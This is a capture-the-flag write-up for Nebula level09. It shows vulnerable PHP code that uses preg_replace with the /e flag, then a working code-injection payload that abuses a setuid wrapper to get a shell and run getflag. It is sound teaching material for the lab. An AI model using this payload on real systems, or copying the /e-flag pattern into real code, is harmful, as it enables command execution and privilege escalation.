# Level09

## Task

>There’s a C setuid wrapper for some vulnerable PHP code…

>To do this level, log in as the level09 account with the password level09. Files for this level can be found in /home/flag09.

```php
<?php

function spam($email)
{
  $email = preg_replace("/\./", " dot ", $email);
  $email = preg_replace("/@/", " AT ", $email);
  
  return $email;
}

function markup($filename, $use_me)
{
  $contents = file_get_contents($filename);

  $contents = preg_replace("/(\[email (.*)\])/e", "spam(\"\\2\")", $contents);
  $contents = preg_replace("/\[/", "<", $contents);
  $contents = preg_replace("/\]/", ">", $contents);

  return $contents;
}

$output = markup($argv[1], $argv[2]);

print $output;

?>
```

## Solution

When `pre_replace` is used with the `/e` flag, the replacement string is substituted, evaluated, and replaced in the original.  By looking at the PHP source code, we see the following: `$contents = preg_replace("/(\[email (.*)\])/e", "spam(\"\\2\")", $contents);` the regex will mean that it is the pattern `([email EMAIL])` where `EMAIL` will be evaluated by the function.

with that in mind crafting the following payload allows us to get the flag

```
level09@nebula:/home/flag09$ echo '[email {${@system($use_me)}}]' > /tmp/09
```

here the email arg will be an argument that will send the next argument to the system.

```
level09@nebula:/home/flag09$ ./flag09 /tmp/09 sh
sh-4.2$ getflag
You have successfully executed getflag on a target account
```
